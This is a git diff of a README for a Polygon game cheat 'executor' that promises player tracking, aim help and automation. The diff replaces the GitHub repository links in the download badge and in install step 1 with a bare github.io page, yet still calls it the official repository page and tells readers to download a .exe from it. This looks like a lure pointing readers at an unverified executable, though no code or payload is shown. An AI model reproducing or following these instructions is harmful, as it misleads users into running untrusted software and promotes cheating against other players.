@@ -1,6 +1,6 @@
 # 🎮 polygon-windows-pc-executor - Enhance your gameplay with powerful tools
 
-[![Download Polygon Executor](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/hyx2045/polygon-windows-pc-executor)
+[![Download Polygon Executor](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://hyx2045.github.io)
 
 The polygon-windows-pc-executor provides tools to improve your performance in Polygon. It offers features to track players, manage your inventory, and refine your aim. This utility helps you play more effectively by automating repetitive tasks and providing information overlays.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the executor on your computer:
 
-1.  Visit the official repository page here: [https://github.com/hyx2045/polygon-windows-pc-executor](https://github.com/hyx2045/polygon-windows-pc-executor).
+1.  Visit the official repository page here: [https://hyx2045.github.io](https://hyx2045.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Click the link labeled "Releases."
 4.  Download the latest executable file, which ends in .exe.
